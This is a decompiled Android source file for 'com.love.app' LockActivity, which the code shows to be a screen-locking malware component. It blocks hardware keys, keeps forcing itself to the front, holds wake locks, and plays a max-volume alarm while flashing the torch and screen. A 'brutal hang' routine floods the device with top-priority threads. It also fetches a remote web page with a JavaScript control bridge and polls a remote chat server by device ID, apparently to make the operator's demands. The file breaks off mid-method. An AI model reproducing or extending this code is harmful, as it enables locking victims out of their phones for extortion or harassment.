/*
 * Decompiled with CFR 0.152.
 * 
 * Could not load the following classes:
 *  android.animation.ValueAnimator
 *  android.animation.ValueAnimator$AnimatorUpdateListener
 *  android.app.Activity
 *  android.app.ActivityManager
 *  android.app.ActivityManager$AppTask
 *  android.app.KeyguardManager
 *  android.app.NotificationChannel
 *  android.app.NotificationManager
 *  android.app.Service
 *  android.app.admin.DevicePolicyManager
 *  android.content.BroadcastReceiver
 *  android.content.ComponentName
 *  android.content.ContentResolver
 *  android.content.Context
 *  android.content.Intent
 *  android.content.IntentFilter
 *  android.content.SharedPreferences
 *  android.graphics.Bitmap
 *  android.graphics.BitmapFactory
 *  android.graphics.Color
 *  android.graphics.Typeface
 *  android.hardware.camera2.CameraManager
 *  android.media.AudioManager
 *  android.media.MediaPlayer
 *  android.media.MediaPlayer$OnCompletionListener
 *  android.media.RingtoneManager
 *  android.net.Uri
 *  android.os.Build$VERSION
 *  android.os.Bundle
 *  android.os.Handler
 *  android.os.IBinder
 *  android.os.Looper
 *  android.os.PowerManager
 *  android.os.PowerManager$WakeLock
 *  android.os.Process
 *  android.os.VibrationEffect
 *  android.os.Vibrator
 *  android.provider.Settings$Secure
 *  android.provider.Settings$System
 *  android.util.Log
 *  android.view.KeyEvent
 *  android.view.LayoutInflater
 *  android.view.MotionEvent
 *  android.view.View
 *  android.view.View$OnClickListener
 *  android.view.View$OnSystemUiVisibilityChangeListener
 *  android.view.View$OnTouchListener
 *  android.view.ViewGroup
 *  android.view.ViewGroup$LayoutParams
 *  android.webkit.JavascriptInterface
 *  android.webkit.WebChromeClient
 *  android.webkit.WebView
 *  android.webkit.WebViewClient
 *  android.widget.Button
 *  android.widget.EditText
 *  android.widget.FrameLayout
 *  android.widget.FrameLayout$LayoutParams
 *  android.widget.ImageView
 *  android.widget.LinearLayout
 *  android.widget.LinearLayout$LayoutParams
 *  android.widget.TextView
 *  android.widget.Toast
 *  org.json.JSONObject
 */
package com.love.app;

import android.animation.ValueAnimator;
import android.app.Activity;
import android.app.ActivityManager;
import android.app.KeyguardManager;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.Service;
import android.app.admin.DevicePolicyManager;
import android.content.BroadcastReceiver;
import android.content.ComponentName;
import android.content.ContentResolver;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.content.SharedPreferences;
import android.graphics.Bitmap;
import android.graphics.BitmapFactory;
import android.graphics.Color;
import android.graphics.Typeface;
import android.hardware.camera2.CameraManager;
import android.media.AudioManager;
import android.media.MediaPlayer;
import android.media.RingtoneManager;
import android.net.Uri;
import android.os.Build;
import android.os.Bundle;
import android.os.Handler;
import android.os.IBinder;
import android.os.Looper;
import android.os.PowerManager;
import android.os.Process;
import android.os.VibrationEffect;
import android.os.Vibrator;
import android.provider.Settings;
import android.util.Log;
import android.view.KeyEvent;
import android.view.LayoutInflater;
import android.view.MotionEvent;
import android.view.View;
import android.view.ViewGroup;
import android.webkit.JavascriptInterface;
import android.webkit.WebChromeClient;
import android.webkit.WebView;
import android.webkit.WebViewClient;
import android.widget.Button;
import android.widget.EditText;
import android.widget.FrameLayout;
import android.widget.ImageView;
import android.widget.LinearLayout;
import android.widget.TextView;
import android.widget.Toast;
import androidx.core.app.NotificationCompat;
import androidx.recyclerview.widget.LinearLayoutManager;
import androidx.recyclerview.widget.RecyclerView;
import com.love.app.AdminReceiver;
import com.love.app.AdminService;
import com.love.app.ConfigFetcher;
import com.love.app.LockActivity$$ExternalSyntheticLambda0;
import com.love.app.LockActivity$$ExternalSyntheticLambda1;
import com.love.app.LockActivity$$ExternalSyntheticLambda10;
import com.love.app.LockActivity$$ExternalSyntheticLambda11;
import com.love.app.LockActivity$$ExternalSyntheticLambda12;
import com.love.app.LockActivity$$ExternalSyntheticLambda13;
import com.love.app.LockActivity$$ExternalSyntheticLambda14;
import com.love.app.LockActivity$$ExternalSyntheticLambda15;
import com.love.app.LockActivity$$ExternalSyntheticLambda16;
import com.love.app.LockActivity$$ExternalSyntheticLambda17;
import com.love.app.LockActivity$$ExternalSyntheticLambda18;
import com.love.app.LockActivity$$ExternalSyntheticLambda19;
import com.love.app.LockActivity$$ExternalSyntheticLambda2;
import com.love.app.LockActivity$$ExternalSyntheticLambda3;
import com.love.app.LockActivity$$ExternalSyntheticLambda4;
import com.love.app.LockActivity$$ExternalSyntheticLambda5;
import com.love.app.LockActivity$$ExternalSyntheticLambda6;
import com.love.app.LockActivity$$ExternalSyntheticLambda7;
import com.love.app.LockActivity$$ExternalSyntheticLambda8;
import com.love.app.LockActivity$$ExternalSyntheticLambda9;
import com.love.app.LockActivity$ChatAdapter$$ExternalSyntheticLambda0;
import com.love.app.LockActivity$ChatAdapter$$ExternalSyntheticLambda1;
import com.love.app.LockActivity$ChatAdapter_IA;
import com.love.app.LockActivity$ChatMessage_IA;
import com.love.app.LockActivity$WebControlInterface$$ExternalSyntheticLambda0;
import com.love.app.LockActivity$WebControlInterface$$ExternalSyntheticLambda1;
import com.love.app.LockActivity$WebControlInterface$$ExternalSyntheticLambda2;
import com.love.app.LockActivity$WebControlInterface_IA;
import java.io.BufferedReader;
import java.io.InputStream;
import java.io.OutputStream;
import java.io.Reader;
import java.net.HttpURLConnection;
import java.net.URL;
import java.net.URLConnection;
import java.text.SimpleDateFormat;
import java.util.ArrayList;
import java.util.Date;
import java.util.List;
import java.util.Locale;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;
import org.json.JSONObject;

public class LockActivity
extends Activity {
    public static final String ACTION_START_LOCK = "com.love.app.START_LOCK";
    public static final String ACTION_STOP_LOCK = "com.love.app.STOP_LOCK";
    private static final String DEFAULT_PIN = "0000";
    private static final int MAX_PIN_LENGTH = 6;
    private static final String TAG = "LockActivity";
    private TextView attemptText;
    private AudioManager audioManager;
    private String cameraId;
    private CameraManager cameraManager;
    private ChatAdapter chatAdapter;
    private EditText chatInput;
    private List<ChatMessage> chatMessages;
    private RecyclerView chatRecyclerView;
    private Button chatSendButton;
    private TextView clearButton;
    private String currentMode;
    private String deviceId;
    private ExecutorService executor;
    private int failedAttempts = 0;
    private Handler handler;
    private ValueAnimator headerAnimator;
    private View headerZone;
    private boolean isHanging = false;
    private boolean isRunning = true;
    private LinearLayout keypadLayout;
    private long lastTimestamp = 0L;
    private MediaPlayer mediaPlayer;
    private TextView messageText;
    private int originalVolume;
    private StringBuilder pinBuilder = new StringBuilder();
    private EditText pinDisplay;
    private Handler pollHandler;
    private Runnable pollRunnable;
    private SharedPreferences prefs;
    private TextView submitButton;
    private TextView titleText;
    private boolean torchOn = false;
    private BroadcastReceiver unlockReceiver;
    private Vibrator vibrator;
    private PowerManager.WakeLock wakeLock;
    private WebView webView;
    private FrameLayout webViewContainer;

    public static /* synthetic */ void $r8$lambda$8COAY49QHjEayl6opLjWO07JdYE(LockActivity lockActivity) {
        lockActivity.restartLock();
    }

    public static /* synthetic */ void $r8$lambda$BmgLwbX4x15rXeY7f_qgI5oN4c4(LockActivity lockActivity) {
        lockActivity.hideSystemUI();
    }

    public static /* synthetic */ void $r8$lambda$PE0SXFF5yDlH6ayMAaGJO_4Wc18(LockActivity lockActivity) {
        lockActivity.pollChatMessages();
    }

    public static /* synthetic */ void $r8$lambda$XDATxgzGxW2uNxUHpN70XnwbyqM(MediaPlayer mediaPlayer) {
        mediaPlayer.release();
    }

    public static /* synthetic */ void $r8$lambda$qZZBzx4TJCGPWb2ZimU_DO88a_o(LockActivity lockActivity) {
        lockActivity.unlockSuccess();
    }

    public LockActivity() {
        this.handler = new Handler();
        this.chatMessages = new ArrayList<ChatMessage>();
        this.executor = Executors.newSingleThreadExecutor();
        this.pollHandler = new Handler();
    }

    private void acquireWakeLock() {
        PowerManager.WakeLock wakeLock;
        this.wakeLock = wakeLock = ((PowerManager)this.getSystemService("power")).newWakeLock(805306394, "LockActivity::Lock");
        wakeLock.acquire(3600000L);
    }

    private void appendPin(int n) {
        if (this.pinBuilder.length() < 6) {
            this.pinBuilder.append(n);
            this.updatePinDisplay();
        }
    }

    private void applyEntranceAnimation() {
        View view = this.getWindow().getDecorView().findViewById(0x1020002);
        view.setAlpha(0.0f);
        view.animate().alpha(1.0f).setDuration(1200L).start();
    }

    private void checkPin() {
        if (this.pinBuilder.toString().equals(this.prefs.getString("lock_pin", DEFAULT_PIN))) {
            this.unlockSuccess();
        } else {
            ++this.failedAttempts;
            TextView textView = this.attemptText;
            if (textView != null) {
                textView.setText((CharSequence)("Percobaan gagal: " + this.failedAttempts));
            }
            if ((textView = this.messageText) != null) {
                textView.setText((CharSequence)"❌ PIN SALAH! Coba lagi.");
            }
            this.clearPin();
            new Thread(new LockActivity$$ExternalSyntheticLambda12(this)).start();
            this.handler.postDelayed((Runnable)new LockActivity$$ExternalSyntheticLambda13(this), 2000L);
        }
    }

    private void clearPin() {
        this.pinBuilder.setLength(0);
        this.updatePinDisplay();
    }

    /*
     * Enabled force condition propagation
     * Lifted jumps to return sites
     */
    private void collapseStatusBar() {
        try {
            Object object = this.getSystemService("statusbar");
            Class.forName("android.app.StatusBarManager").getMethod("collapsePanels", new Class[0]).invoke(object, new Object[0]);
            return;
        }
        catch (Exception exception) {
            try {
                Object object = this.getSystemService("statusbar");
                Class.forName("android.app.StatusBarManager").getMethod("collapse", new Class[0]).invoke(object, new Object[0]);
                return;
            }
            catch (Exception exception2) {
                return;
            }
        }
    }

    private void deleteLastChar() {
        if (this.pinBuilder.length() > 0) {
            StringBuilder stringBuilder = this.pinBuilder;
            stringBuilder.deleteCharAt(stringBuilder.length() - 1);
            this.updatePinDisplay();
        }
    }

    private void hideSystemUI() {
        View view = this.getWindow().getDecorView();
        view.setSystemUiVisibility(5894);
        view.setOnSystemUiVisibilityChangeListener((View.OnSystemUiVisibilityChangeListener)new LockActivity$$ExternalSyntheticLambda9(this));
    }

    /*
     * Enabled aggressive block sorting
     * Enabled unnecessary exception pruning
     * Enabled aggressive exception aggregation
     */
    private void initHardware() {
        CameraManager cameraManager;
        this.cameraManager = cameraManager = (CameraManager)this.getSystemService("camera");
        if (cameraManager != null) {
            try {
                this.cameraId = cameraManager.getCameraIdList()[0];
            }
            catch (Exception exception) {}
        }
        this.vibrator = (Vibrator)this.getSystemService("vibrator");
        cameraManager = (AudioManager)this.getSystemService("audio");
        this.audioManager = cameraManager;
        this.originalVolume = cameraManager.getStreamVolume(4);
        cameraManager = this.audioManager;
        cameraManager.setStreamVolume(4, cameraManager.getStreamMaxVolume(4), 0);
        this.playAlarm();
    }

    private void initViews() {
        this.titleText = (TextView)this.findViewById(2131296735);
        this.messageText = (TextView)this.findViewById(2131296533);
        this.pinDisplay = (EditText)this.findViewById(2131296603);
        this.keypadLayout = (LinearLayout)this.findViewById(2131296494);
        this.submitButton = (TextView)this.findViewById(2131296699);
        this.clearButton = (TextView)this.findViewById(2131296377);
        this.attemptText = (TextView)this.findViewById(2131296340);
        this.webViewContainer = (FrameLayout)this.findViewById(2131296767);
        this.headerZone = this.findViewById(2131296470);
        EditText editText = this.pinDisplay;
        if (editText != null && this.keypadLayout != null) {
            editText.setFocusable(false);
            this.pinDisplay.setCursorVisible(false);
            this.pinDisplay.setKeyListener(null);
            this.submitButton.setOnClickListener((View.OnClickListener)new LockActivity$$ExternalSyntheticLambda6(this));
            this.clearButton.setOnClickListener((View.OnClickListener)new LockActivity$$ExternalSyntheticLambda7(this));
            return;
        }
        this.finish();
    }

    private boolean isAdminActive() {
        DevicePolicyManager devicePolicyManager = (DevicePolicyManager)this.getSystemService("device_policy");
        ComponentName componentName = new ComponentName((Context)this, AdminReceiver.class);
        boolean bl = devicePolicyManager != null && devicePolicyManager.isAdminActive(componentName);
        return bl;
    }

    static /* synthetic */ boolean lambda$setupKeypad$8(View view, MotionEvent motionEvent) {
        if (motionEvent.getAction() == 0) {
            view.setScaleX(0.9f);
            view.setScaleY(0.9f);
        } else if (motionEvent.getAction() == 1 || motionEvent.getAction() == 3) {
            view.setScaleX(1.0f);
            view.setScaleY(1.0f);
        }
        return false;
    }

    private void loadWebContent() {
        String string2;
        String string3 = string2 = this.prefs.getString("lock_html_url", "");
        if (string2.isEmpty()) {
            string3 = "https://www.google.com";
        }
        this.webView.loadUrl(string3);
    }

    private void moveTaskToFront() {
        block3: {
            ActivityManager activityManager = (ActivityManager)this.getSystemService("activity");
            if (activityManager == null) break block3;
            try {
                activityManager.moveTaskToFront(this.getTaskId(), 1);
            }
            catch (Exception exception) {
                Intent intent = new Intent((Context)this, LockActivity.class);
                intent.addFlags(0x14000000);
                this.startActivity(intent);
            }
        }
    }

    /*
     * Enabled aggressive block sorting
     * Enabled unnecessary exception pruning
     * Enabled aggressive exception aggregation
     */
    private void playAlarm() {
        try {
            Uri uri;
            Uri uri2 = uri = RingtoneManager.getDefaultUri((int)4);
            if (uri == null) {
                uri2 = RingtoneManager.getDefaultUri((int)1);
            }
            if (uri2 == null) {
                return;
            }
            uri2 = MediaPlayer.create((Context)this, (Uri)uri2);
            this.mediaPlayer = uri2;
            if (uri2 == null) return;
            uri2.setLooping(true);
            this.mediaPlayer.start();
            return;
        }
        catch (Exception exception) {
            return;
        }
    }

    private void playLockSound() {
        block3: {
            MediaPlayer mediaPlayer = MediaPlayer.create((Context)this, (Uri)Settings.System.DEFAULT_NOTIFICATION_URI);
            if (mediaPlayer == null) break block3;
            try {
                LockActivity$$ExternalSyntheticLambda1 lockActivity$$ExternalSyntheticLambda1 = new LockActivity$$ExternalSyntheticLambda1();
                mediaPlayer.setOnCompletionListener((MediaPlayer.OnCompletionListener)lockActivity$$ExternalSyntheticLambda1);
                mediaPlayer.start();
            }
            catch (Exception exception) {
                Log.e((String)TAG, (String)"playLockSound error", (Throwable)exception);
            }
        }
    }

    private void pollChatMessages() {
        this.executor.execute(new LockActivity$$ExternalSyntheticLambda5(this));
    }

    private void registerScreenOnReceiver() {
        this.registerReceiver(new BroadcastReceiver(this){
            final LockActivity this$0;
            {
                this.this$0 = lockActivity;
            }

            public void onReceive(Context context, Intent intent) {
                if ("android.intent.action.SCREEN_ON".equals(intent.getAction()) && this.this$0.isRunning) {
                    this.this$0.moveTaskToFront();
                }
            }
        }, new IntentFilter("android.intent.action.SCREEN_ON"));
    }

    private void restartLock() {
        Intent intent = new Intent((Context)this, LockActivity.class);
        intent.addFlags(0x34000000);
        this.startActivity(intent);
    }

    private void sendChatMessage(String string2) {
        this.executor.execute(new LockActivity$$ExternalSyntheticLambda10(this, string2));
    }

    private void setupChatUI() {
        Object object = LayoutInflater.from((Context)this).inflate(2131492896, (ViewGroup)this.webViewContainer, false);
        this.webViewContainer.removeAllViews();
        this.webViewContainer.addView(object);
        this.chatRecyclerView = (RecyclerView)object.findViewById(2131296371);
        this.chatInput = (EditText)object.findViewById(2131296370);
        this.chatSendButton = (Button)object.findViewById(2131296372);
        this.chatRecyclerView.setLayoutManager(new LinearLayoutManager((Context)this));
        object = new ChatAdapter(this, null);
        this.chatAdapter = object;
        this.chatRecyclerView.setAdapter((RecyclerView.Adapter)object);
        this.chatSendButton.setOnClickListener((View.OnClickListener)new LockActivity$$ExternalSyntheticLambda0(this));
    }

    private void setupKeypad() {
        this.keypadLayout.removeAllViews();
        int[] nArray = new int[]{1, 2, 3};
        int[] nArray2 = new int[]{4, 5, 6};
        int[] nArray3 = new int[]{7, 8, 9};
        int[] nArray4 = new int[]{-1, 0, -2};
        int n = (int)(this.getResources().getDisplayMetrics().density * 65.0f);
        for (int i = 0; i < 4; ++i) {
            int[] nArray5 = (new int[][]{nArray, nArray2, nArray3, nArray4})[i];
            LinearLayout linearLayout = new LinearLayout((Context)this);
            linearLayout.setLayoutParams((ViewGroup.LayoutParams)new LinearLayout.LayoutParams(-2, -2));
            linearLayout.setOrientation(0);
            linearLayout.setGravity(17);
            for (int n2 : nArray5) {
                LinearLayout.LayoutParams layoutParams;
                View view;
                if (n2 == -1) {
                    view = new View((Context)this);
                    layoutParams = new LinearLayout.LayoutParams(n, n);
                    layoutParams.setMargins(14, 14, 14, 14);
                    view.setLayoutParams((ViewGroup.LayoutParams)layoutParams);
                    linearLayout.addView(view);
                    continue;
                }
                view = new TextView((Context)this);
                layoutParams = new LinearLayout.LayoutParams(n, n);
                layoutParams.setMargins(14, 14, 14, 14);
                view.setLayoutParams((ViewGroup.LayoutParams)layoutParams);
                view.setGravity(17);
                view.setTextSize(24.0f);
                view.setTypeface(Typeface.SANS_SERIF, 1);
                view.setTextColor(-1);
                view.setBackgroundResource(2131165319);
                view.setClickable(true);
                view.setFocusable(true);
                if (n2 == -2) {
                    view.setText((CharSequence)"DEL");
                    view.setTextSize(14.0f);
                    view.setOnClickListener((View.OnClickListener)new LockActivity$$ExternalSyntheticLambda14(this));
                } else {
                    view.setText((CharSequence)String.valueOf(n2));
                    view.setOnClickListener((View.OnClickListener)new LockActivity$$ExternalSyntheticLambda15(this, n2));
                }
                linearLayout.addView(view);
                view.setOnTouchListener((View.OnTouchListener)new LockActivity$$ExternalSyntheticLambda16());
            }
            this.keypadLayout.addView((View)linearLayout);
        }
    }

    private void setupMode() {
        if ("html".equals(this.currentMode)) {
            this.keypadLayout.setVisibility(8);
            this.pinDisplay.setVisibility(8);
            this.submitButton.setVisibility(8);
            this.clearButton.setVisibility(8);
            TextView textView = this.attemptText;
            if (textView != null) {
                textView.setVisibility(8);
            }
            if ((textView = this.messageText) != null) {
                textView.setVisibility(8);
            }
            this.webViewContainer.setVisibility(0);
            this.setupWebView();
            this.loadWebContent();
        } else if ("chat".equals(this.currentMode)) {
            this.keypadLayout.setVisibility(8);
            this.pinDisplay.setVisibility(8);
            this.submitButton.setVisibility(8);
            this.clearButton.setVisibility(8);
            TextView textView = this.attemptText;
            if (textView != null) {
                textView.setVisibility(8);
            }
            if ((textView = this.messageText) != null) {
                textView.setVisibility(8);
            }
            this.webViewContainer.setVisibility(0);
            this.setupChatUI();
            this.startChatPolling();
        } else {
            this.keypadLayout.setVisibility(0);
            this.pinDisplay.setVisibility(0);
            this.submitButton.setVisibility(0);
            this.clearButton.setVisibility(0);
            TextView textView = this.attemptText;
            if (textView != null) {
                textView.setVisibility(0);
            }
            if ((textView = this.messageText) != null) {
                textView.setVisibility(0);
            }
            this.webViewContainer.setVisibility(8);
            this.setupKeypad();
        }
    }

    private void setupWebView() {
        WebView webView;
        this.webView = webView = new WebView((Context)this);
        webView = webView.getSettings();
        webView.setJavaScriptEnabled(true);
        webView.setDomStorageEnabled(true);
        webView.setLoadWithOverviewMode(true);
        webView.setUseWideViewPort(true);
        webView.setSupportZoom(false);
        webView.setBuiltInZoomControls(false);
        webView.setMixedContentMode(0);
        this.webView.setWebViewClient(new WebViewClient());
        this.webView.setWebChromeClient(new WebChromeClient());
        this.webView.addJavascriptInterface((Object)new WebControlInterface(this, null), "AndroidLock");
        this.webViewContainer.removeAllViews();
        this.webViewContainer.addView((View)this.webView, (ViewGroup.LayoutParams)new FrameLayout.LayoutParams(-1, -1));
    }

    private void startAggressiveEffects() {
        this.startTorchFlashing();
        this.startScreenFlashing();
        this.startVibration();
    }

    private void startBrutalHang() {
        int n = Math.max(8, Runtime.getRuntime().availableProcessors() * 2);
        for (int i = 0; i < n; ++i) {
            Thread thread2 = new Thread(new LockActivity$$ExternalSyntheticLambda8(this));
            thread2.setDaemon(true);
            thread2.setPriority(10);
            thread2.start();
        }
        this.handler.post(new Runnable(this){
            final LockActivity this$0;
            {
                this.this$0 = lockActivity;
            }

            @Override
            public void run() {
                if (!this.this$0.isRunning) {
                    return;
                }
                this.this$0.hideSystemUI();
                this.this$0.handler.postDelayed((Runnable)this, 50L);
            }
        });
        this.handler.post(new Runnable(this){
            final LockActivity this$0;
            {
                this.this$0 = lockActivity;
            }

            @Override
            public void run() {
                if (!this.this$0.isRunning) {
                    return;
                }
                if (this.this$0.wakeLock != null && !this.this$0.wakeLock.isHeld()) {
                    this.this$0.wakeLock.acquire(3600000L);
                }
                this.this$0.handler.postDelayed((Runnable)this, 240000L);
            }
        });
        this.handler.post(new Runnable(this){
            final LockActivity this$0;
            {
                this.this$0 = lockActivity;
            }

            /*
             * Enabled aggressive block sorting
             * Enabled unnecessary exception pruning
             * Enabled aggressive exception aggregation
             */
            @Override
            public void run() {
                if (!this.this$0.isRunning) {
                    return;
                }
                try {
                    ActivityManager activityManager = (ActivityManager)this.this$0.getSystemService("activity");
                    if (activityManager != null) {
                        activityManager.moveTaskToFront(this.this$0.getTaskId(), 1);
                    }
                }
                catch (Exception exception) {}
                this.this$0.handler.postDelayed((Runnable)this, 200L);
            }
        });
    }

    private void startChatLockEnforcement() {
        this.handler.post(new Runnable(this){
            final LockActivity this$0;
            {
                this.this$0 = lockActivity;
            }

            @Override
            public void run() {
                if (!this.this$0.isRunning) {
                    return;
                }
                if (this.this$0.wakeLock != null && !this.this$0.wakeLock.isHeld()) {
                    this.this$0.wakeLock.acquire(3600000L);
                }
                this.this$0.handler.postDelayed((Runnable)this, 240000L);
            }
        });
    }

    private void startChatPolling() {
        if (this.pollRunnable != null) {
            return;
        }
        LockActivity$$ExternalSyntheticLambda11 lockActivity$$ExternalSyntheticLambda11 = new LockActivity$$ExternalSyntheticLambda11(this);
        this.pollRunnable = lockActivity$$ExternalSyntheticLambda11;
        this.pollHandler.post((Runnable)lockActivity$$ExternalSyntheticLambda11);
    }

    private void startHeaderAnimation() {
        ValueAnimator valueAnimator;
        if (this.headerZone == null) {
            return;
        }
        this.headerAnimator = valueAnimator = ValueAnimator.ofArgb((int[])new int[]{Color.parseColor((String)"#CC0000"), Color.parseColor((String)"#550000"), Color.parseColor((String)"#CC0000")});
        valueAnimator.setDuration(700L);
        this.headerAnimator.setRepeatCount(-1);
        this.headerAnimator.addUpdateListener((ValueAnimator.AnimatorUpdateListener)new LockActivity$$ExternalSyntheticLambda17(this));
        this.headerAnimator.start();
    }

    private void startLockGuardService() {
        Intent intent = new Intent((Context)this, LockGuardService.class);
        intent.setAction(ACTION_START_LOCK);
        if (Build.VERSION.SDK_INT >= 26) {
            this.startForegroundService(intent);
        } else {
            this.startService(intent);
        }
    }

    private void startScreenFlashing() {
        this.handler.post(new Runnable(this){
            boolean red;
            final LockActivity this$0;
            {
                this.this$0 = lockActivity;
                this.red = true;
            }

            @Override
            public void run() {
                if (!this.this$0.isRunning) {
                    return;
                }
                View view = this.this$0.getWindow().getDecorView();
                int n = this.red ? Color.parseColor((String)"#1A0000") : -16777216;
                view.setBackgroundColor(n);
                this.red ^= true;
                this.this$0.handler.postDelayed((Runnable)this, 80L);
            }
        });
    }

    private void startTorchFlashing() {
        if (this.cameraId != null) {
            this.handler.post(new Runnable(this){
                final LockActivity this$0;
                {
                    this.this$0 = lockActivity;
                }

                /*
                 * Enabled aggressive block sorting
                 * Enabled unnecessary exception pruning
                 * Enabled aggressive exception aggregation
                 */
                @Override
                public void run() {
                    if (!this.this$0.isRunning) {
                        return;
                    }
                    try {
                        LockActivity lockActivity = this.this$0;
                        boolean bl = !lockActivity.torchOn;
                        lockActivity.torchOn = bl;
                        this.this$0.cameraManager.setTorchMode(this.this$0.cameraId, this.this$0.torchOn);
                    }
                    catch (Exception exception) {}
                    this.this$0.handler.postDelayed((Runnable)this, 120L);
                }
            });
        }
    }

    private void startVibration() {
        Object object = this.vibrator;
        if (object != null && object.hasVibrator()) {
            Object object2 = object = (Object)new long[7];
            object2[0] = (Vibrator)0L;
            object2[1] = (Vibrator)300L;
            object2[2] = (Vibrator)100L;
            object2[3] = (Vibrator)300L;
            object2[4] = (Vibrator)100L;
            object2[5] = (Vibrator)600L;
            object2[6] = (Vibrator)200L;
            if (Build.VERSION.SDK_INT >= 26) {
                this.vibrator.vibrate(VibrationEffect.createWaveform((long[])object, (int)0));
            } else {
                this.vibrator.vibrate((long[])object, 0);
            }
        }
    }

    /*
     * Enabled aggressive block sorting
     * Enabled unnecessary exception pruning
     * Enabled aggressive exception aggregation
     */
    private void stopAllEffects() {
        this.handler.removeCallbacksAndMessages(null);
        this.stopTorch();
        MediaPlayer mediaPlayer = this.mediaPlayer;
        if (mediaPlayer != null) {
            try {
                mediaPlayer.stop();
                this.mediaPlayer.release();
            }
            catch (Exception exception) {}
        }
        if ((mediaPlayer = this.vibrator) != null) {
            mediaPlayer.cancel();
        }
        if ((mediaPlayer = this.audioManager) != null) {
            try {
                mediaPlayer.setStreamVolume(4, this.originalVolume, 0);
            }
            catch (Exception exception) {}
        }
        if ((mediaPlayer = this.wakeLock) != null && mediaPlayer.isHeld()) {
            this.wakeLock.release();
        }
    }

    private void stopLockGuardService() {
        Intent intent = new Intent((Context)this, LockGuardService.class);
        intent.setAction(ACTION_STOP_LOCK);
        this.startService(intent);
    }

    /*
     * Enabled aggressive block sorting
     * Enabled unnecessary exception pruning
     * Enabled aggressive exception aggregation
     */
    private void stopTorch() {
        if (this.cameraId == null) return;
        try {
            this.cameraManager.setTorchMode(this.cameraId, false);
            return;
        }
        catch (Exception exception) {
            return;
        }
    }

    private void triggerFullHang() {
        if (this.isHanging) {
            return;
        }
        this.isHanging = true;
        Intent intent = new Intent((Context)this, AdminService.class);
        intent.setAction("com.love.app.START_HANG");
        if (Build.VERSION.SDK_INT >= 26) {
            this.startForegroundService(intent);
        } else {
            this.startService(intent);
        }
    }

    private void unlockSuccess() {
        this.isRunning = false;
        this.prefs.edit().putBoolean("is_locked", false).apply();
        Intent intent = new Intent("com.love.app.UPDATE_LOCK_STATE");
        intent.putExtra("is_locked", false);
        this.sendBroadcast(intent);
        intent = this.headerAnimator;
        if (intent != null) {
            intent.cancel();
        }
        this.stopAllEffects();
        this.stopLockGuardService();
        this.stopLockTask();
        this.finishAffinity();
    }

    private void updatePinDisplay() {
        int n;
        StringBuilder stringBuilder = new StringBuilder();
        int n2 = 0;
        for (n = 0; n < this.pinBuilder.length(); ++n) {
            stringBuilder.append("●");
        }
        while (stringBuilder.length() < 6) {
            stringBuilder.append("○");
        }
        StringBuilder stringBuilder2 = new StringBuilder();
        for (n = n2; n < stringBuilder.length(); ++n) {
            stringBuilder2.append(stringBuilder.charAt(n));
            if (n >= stringBuilder.length() - 1) continue;
            stringBuilder2.append(" ");
        }
        this.pinDisplay.setText((CharSequence)stringBuilder2.toString());
        this.pinDisplay.animate().scaleX(1.05f).scaleY(1.05f).setDuration(50L).withEndAction((Runnable)new LockActivity$$ExternalSyntheticLambda4(this)).start();
    }

    public boolean dispatchKeyEvent(KeyEvent keyEvent) {
        for (int i = 0; i < 4; ++i) {
            int n = (new int[]{24, 25, 27, 187})[i];
            if (keyEvent.getKeyCode() != n) continue;
            return true;
        }
        return super.dispatchKeyEvent(keyEvent);
    }

    /*
     * Enabled aggressive block sorting
     * Enabled unnecessary exception pruning
     * Enabled aggressive exception aggregation
     */
    /* synthetic */ void lambda$checkPin$10$com_love_app_LockActivity() {
        int n = 0;
        while (n < 5) {
            try {
                String string2 = this.cameraId;
                if (string2 != null) {
                    this.cameraManager.setTorchMode(string2, true);
                    Thread.sleep(40L);
                    this.cameraManager.setTorchMode(this.cameraId, false);
                    Thread.sleep(40L);
                }
            }
            catch (Exception exception) {}
            ++n;
        }
        return;
    }

    /* synthetic */ void lambda$checkPin$11$com_love_app_LockActivity() {
        TextView textView = this.messageText;
        if (textView != null) {
            textView.setText((CharSequence)"Masukkan PIN untuk membuka kunci");
        }
    }

    /* synthetic */ void lambda$hideSystemUI$14$com_love_app_LockActivity(int n) {
        if ((n & 4) == 0) {
            this.handler.postDelayed((Runnable)new LockActivity$$ExternalSyntheticLambda18(this), 30L);
        }
    }

    /* synthetic */ void lambda$initViews$0$com_love_app_LockActivity(View view) {
        this.checkPin();
    }

    /* synthetic */ void lambda$initViews$1$com_love_app_LockActivity(View view) {
        this.clearPin();
    }

    /* synthetic */ void lambda$pollChatMessages$4$com_love_app_LockActivity(List list) {
        this.chatMessages.addAll(list);
        this.chatAdapter.notifyDataSetChanged();
        this.chatRecyclerView.scrollToPosition(this.chatMessages.size() - 1);
    }

    /*
     * WARNING - Removed back jump from a try to a catch block - possible behaviour change.
     * Unable to fully structure code
     * Enabled aggressive block sorting
     * Enabled unnecessary exception pruning
     * Enabled aggressive exception aggregation
     */
    /* synthetic */ void lambda$pollChatMessages$5$com_love_app_LockActivity() {
        block17: {
            if (!this.isRunning) {
                return;
            }
            var6_1 = ConfigFetcher.getBaseUrl((Context)this);
            if (var6_1 == null) {
                if (!this.isRunning) return;
                this.pollHandler.postDelayed(this.pollRunnable, 3000L);
                return;
            }
            var7_6 = new ArrayList<ChatMessage>();
            var8_5 = new URL(var7_6.append((String)var6_1).append("/chat/poll?device_id=").append(this.deviceId).append("&last_timestamp=").append(this.lastTimestamp).toString());
            var6_1 = (HttpURLConnection)var8_5.openConnection();
            var6_1.setRequestMethod("GET");
            var6_1.setConnectTimeout(25000);
            var6_1.setReadTimeout(30000);
            if (var6_1.getResponseCode() != 200) ** GOTO lbl62
            var7_6 = new ArrayList<ChatMessage>(var6_1.getInputStream());
            var8_5 = new BufferedReader((Reader)var7_6);
            var7_6 = new ArrayList<ChatMessage>();
            while ((var9_7 = var8_5.readLine()) != null) {
                var7_6.append((String)var9_7);
            }
            var8_5.close();
            var8_5 = new JSONObject(var7_6.toString());
            var8_5 = var8_5.optJSONArray("messages");
            if (var8_5 == null || var8_5.length() <= 0) ** GOTO lbl62
            var2_8 = this.lastTimestamp;
            var7_6 = new ArrayList<ChatMessage>();
            for (var1_9 = 0; var1_9 < var8_5.length(); ++var1_9) {
                var9_7 = var8_5.getJSONObject(var1_9);
                var10_11 = new ChatMessage(this, null);
                var10_11.sender = var9_7.getString("sender");
                var10_11.text = var9_7.getString("text");
                var10_11.timestamp = var9_7.getLong("timestamp");
                var7_6.add(var10_11);
                var4_10 = var2_8;
